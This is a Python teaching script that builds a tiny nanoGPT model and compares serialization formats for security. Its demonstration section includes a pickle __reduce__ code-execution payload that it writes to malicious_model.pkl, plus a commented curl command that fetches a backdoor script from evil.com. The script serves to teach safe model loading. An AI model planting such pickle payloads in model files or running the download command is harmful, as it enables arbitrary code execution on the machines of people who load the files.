#!/usr/bin/env python3
"""
NanoGPT-based Model Serialization and Security Demo
Based on Karpathy's nanoGPT: https://github.com/karpathy/nanoGPT

This demonstrates:
1. Creating a minimal GPT model
2. Various serialization formats
3. Security implications of each format
4. How to convert between formats safely
"""

import torch
import torch.nn as nn
from torch.nn import functional as F
import numpy as np
import pickle
import json
import struct
import math
from dataclasses import dataclass
from pathlib import Path

# Configuration for a tiny GPT
@dataclass
class GPTConfig:
    block_size: int = 64        # max sequence length
    vocab_size: int = 50        # vocabulary size
    n_layer: int = 4           # number of layers
    n_head: int = 4            # number of heads
    n_embd: int = 32           # embedding dimension
    dropout: float = 0.0       # dropout rate
    bias: bool = False         # use bias in linear layers

class CausalSelfAttention(nn.Module):
    """Multi-head masked self-attention from nanoGPT"""
    
    def __init__(self, config):
        super().__init__()
        assert config.n_embd % config.n_head == 0
        # key, query, value projections for all heads
        self.c_attn = nn.Linear(config.n_embd, 3 * config.n_embd, bias=config.bias)
        # output projection
        self.c_proj = nn.Linear(config.n_embd, config.n_embd, bias=config.bias)
        # regularization
        self.attn_dropout = nn.Dropout(config.dropout)
        self.resid_dropout = nn.Dropout(config.dropout)
        self.n_head = config.n_head
        self.n_embd = config.n_embd
        self.dropout = config.dropout

    def forward(self, x):
        B, T, C = x.size()
        
        # calculate query, key, values for all heads in batch
        q, k, v  = self.c_attn(x).split(self.n_embd, dim=2)
        k = k.view(B, T, self.n_head, C // self.n_head).transpose(1, 2)
        q = q.view(B, T, self.n_head, C // self.n_head).transpose(1, 2)
        v = v.view(B, T, self.n_head, C // self.n_head).transpose(1, 2)

        # causal self-attention
        att = (q @ k.transpose(-2, -1)) * (1.0 / math.sqrt(k.size(-1)))
        att = att.masked_fill(torch.tril(torch.ones(T, T)).view(1, 1, T, T) == 0, float('-inf'))
        att = F.softmax(att, dim=-1)
        att = self.attn_dropout(att)
        y = att @ v
        y = y.transpose(1, 2).contiguous().view(B, T, C)

        # output projection
        y = self.resid_dropout(self.c_proj(y))
        return y

class MLP(nn.Module):
    """MLP block from nanoGPT"""
    
    def __init__(self, config):
        super().__init__()
        self.c_fc    = nn.Linear(config.n_embd, 4 * config.n_embd, bias=config.bias)
        self.gelu    = nn.GELU()
        self.c_proj  = nn.Linear(4 * config.n_embd, config.n_embd, bias=config.bias)
        self.dropout = nn.Dropout(config.dropout)

    def forward(self, x):
        x = self.c_fc(x)
        x = self.gelu(x)
        x = self.c_proj(x)
        x = self.dropout(x)
        return x

class Block(nn.Module):
    """Transformer block from nanoGPT"""
    
    def __init__(self, config):
        super().__init__()
        self.ln_1 = nn.LayerNorm(config.n_embd)
        self.attn = CausalSelfAttention(config)
        self.ln_2 = nn.LayerNorm(config.n_embd)
        self.mlp = MLP(config)

    def forward(self, x):
        x = x + self.attn(self.ln_1(x))
        x = x + self.mlp(self.ln_2(x))
        return x

class GPT(nn.Module):
    """GPT Language Model from nanoGPT"""
    
    def __init__(self, config):
        super().__init__()
        self.config = config

        self.transformer = nn.ModuleDict(dict(
            wte = nn.Embedding(config.vocab_size, config.n_embd),
            wpe = nn.Embedding(config.block_size, config.n_embd),
            drop = nn.Dropout(config.dropout),
            h = nn.ModuleList([Block(config) for _ in range(config.n_layer)]),
            ln_f = nn.LayerNorm(config.n_embd),
        ))
        self.lm_head = nn.Linear(config.n_embd, config.vocab_size, bias=False)
        # weight sharing
        self.transformer.wte.weight = self.lm_head.weight

        # init all weights
        self.apply(self._init_weights)

    def _init_weights(self, module):
        if isinstance(module, nn.Linear):
            torch.nn.init.normal_(module.weight, mean=0.0, std=0.02)
            if module.bias is not None:
                torch.nn.init.zeros_(module.bias)
        elif isinstance(module, nn.Embedding):
            torch.nn.init.normal_(module.weight, mean=0.0, std=0.02)

    def forward(self, idx, targets=None):
        device = idx.device
        b, t = idx.size()
        assert t <= self.config.block_size, f"Cannot forward sequence of length {t}, block size is only {self.config.block_size}"
        pos = torch.arange(0, t, dtype=torch.long, device=device)

        # forward the GPT model
        tok_emb = self.transformer.wte(idx)
        pos_emb = self.transformer.wpe(pos)
        x = self.transformer.drop(tok_emb + pos_emb)
        for block in self.transformer.h:
            x = block(x)
        x = self.transformer.ln_f(x)
        logits = self.lm_head(x)

        # calculate loss if targets provided
        loss = None
        if targets is not None:
            loss = F.cross_entropy(logits.view(-1, logits.size(-1)), targets.view(-1), ignore_index=-1)

        return logits, loss

# Create and demonstrate different serialization formats
def main():
    print("🚀 NanoGPT Model Serialization Demo")
    print("=" * 50)
    
    # 1. Create a tiny GPT model
    config = GPTConfig()
    model = GPT(config)
    
    # Count parameters
    n_params = sum(p.numel() for p in model.parameters())
    print(f"✓ Created nanoGPT with {n_params:,} parameters")
    print(f"  Config: {config.n_layer} layers, {config.n_head} heads, {config.n_embd} embed dim")
    
    # 2. Standard PyTorch save (uses pickle internally - UNSAFE)
    print("\n📦 Serialization Formats:")
    
    # PyTorch format
    torch.save({
        'model_state_dict': model.state_dict(),
        'config': config,
    }, 'nanogpt.pth')
    print("  ✓ Saved nanogpt.pth (PyTorch format - uses pickle)")
    
    # Pure pickle (DANGEROUS - demonstrates the risk)
    with open('nanogpt.pkl', 'wb') as f:
        pickle.dump(model, f)
    print("  ✓ Saved nanogpt.pkl (Raw pickle - UNSAFE)")
    
    # 3. Safe formats
    
    # Safetensors format (if available)
    try:
        from safetensors.torch import save_model
        save_model(model, 'nanogpt.safetensors')
        print("  ✓ Saved nanogpt.safetensors (SAFE format)")
    except ImportError:
        print("  ⚠️  Install safetensors for secure model saving: pip install safetensors")
    
    # 4. Custom GGUF format for nanoGPT
    def save_nanogpt_gguf(model, config, filename):
        """Save nanoGPT in GGUF format"""
        with open(filename, 'wb') as f:
            # GGUF header
            f.write(b'GGUF')
            f.write(struct.pack('<I', 3))  # version
            
            # Get all tensors
            tensors = [(name, param) for name, param in model.named_parameters()]
            f.write(struct.pack('<Q', len(tensors)))  # tensor count
            
            # Metadata count
            metadata_items = 6
            f.write(struct.pack('<Q', metadata_items))
            
            # Helper to write strings
            def write_string(s):
                s_bytes = s.encode('utf-8')
                f.write(struct.pack('<Q', len(s_bytes)))
                f.write(s_bytes)
            
            # Write metadata
            write_string("general.architecture")
            f.write(struct.pack('<I', 8))  # string type
            write_string("gpt")
            
            write_string("general.name")
            f.write(struct.pack('<I', 8))
            write_string("nanogpt-tiny")
            
            write_string("gpt.n_layers")
            f.write(struct.pack('<I', 4))  # uint32
            f.write(struct.pack('<I', config.n_layer))
            
            write_string("gpt.n_heads")
            f.write(struct.pack('<I', 4))
            f.write(struct.pack('<I', config.n_head))
            
            write_string("gpt.n_embd")
            f.write(struct.pack('<I', 4))
            f.write(struct.pack('<I', config.n_embd))
            
            write_string("gpt.context_length")
            f.write(struct.pack('<I', 4))
            f.write(struct.pack('<I', config.block_size))
            
            # Alignment
            pos = f.tell()
            alignment = 32
            padding = (alignment - (pos % alignment)) % alignment
            f.write(b'\x00' * padding)
            
            # Write tensor metadata
            offset = 0
            tensor_offsets = []
            for name, param in tensors:
                write_string(name)
                f.write(struct.pack('<I', len(param.shape)))
                for dim in param.shape:
                    f.write(struct.pack('<Q', dim))
                f.write(struct.pack('<I', 0))  # F32 type
                tensor_offsets.append(offset)
                f.write(struct.pack('<Q', offset))
                offset += param.numel() * 4
            
            # Write tensor data
            for name, param in tensors:
                data = param.detach().cpu().numpy().astype(np.float32)
                f.write(data.tobytes())
    
    save_nanogpt_gguf(model, config, 'nanogpt.gguf')
    print("  ✓ Saved nanogpt.gguf (Custom GGUF - SAFE)")
    
    # 5. Demonstrate security risks
    print("\n⚠️  Security Demonstration:")
    
    class MaliciousGPT:
        """Malicious 'model' that executes code when unpickled"""
        def __reduce__(self):
            # This code runs when unpickling!
            cmd = """
import subprocess
import sys
# In real attack: download and execute payload
print("💀 PWNED: Arbitrary code execution via pickle!")
# subprocess.run(['curl', 'evil.com/backdoor.sh', '-o', '/tmp/backdoor.sh'])
"""
            return (exec, (cmd,))
    
    # Save malicious "model" (DON'T load this!)
    with open('malicious_model.pkl', 'wb') as f:
        pickle.dump(MaliciousGPT(), f)
    print("  ✓ Created malicious_model.pkl (DO NOT LOAD)")
    
    # 6. Show safe loading
    print("\n🔒 Safe Loading Examples:")
    
    # Safe PyTorch loading
    checkpoint = torch.load('nanogpt.pth', weights_only=True)
    print("  ✓ Safely loaded nanogpt.pth with weights_only=True")
    
    # Demonstrate file sizes
    print("\n📊 File Sizes:")
    for file in ['nanogpt.pth', 'nanogpt.pkl', 'nanogpt.gguf', 'nanogpt.safetensors']:
        if Path(file).exists():
            size = Path(file).stat().st_size
            print(f"  {file}: {size:,} bytes ({size/1024:.1f} KB)")
    
    # 7. Conversion script for org-mode
    print("\n📝 Org-mode Integration:")
    print("""
#+BEGIN_SRC python :tangle convert_model.py :mkdirp t
# Convert PyTorch model to safe GGUF format
import torch
from pathlib import Path

def convert_to_gguf(pytorch_file, output_file):
    \"\"\"Convert PyTorch checkpoint to GGUF\"\"\"
    # Load with safety check
    ckpt = torch.load(pytorch_file, weights_only=True)
    # ... conversion logic ...
    print(f"Converted {pytorch_file} -> {output_file}")

if __name__ == "__main__":
    convert_to_gguf("model.pth", "model.gguf")
#+END_SRC
""")
    
    print("\n✅ Demo complete! Key takeaways:")
    print("  1. PyTorch .pth files use pickle (can execute code)")
    print("  2. GGUF/safetensors are data-only formats (safe)")
    print("  3. Always use weights_only=True when loading")
    print("  4. Verify model sources before loading")
    print("  5. Consider sandboxing when testing unknown models")

if __name__ == "__main__":
    main()
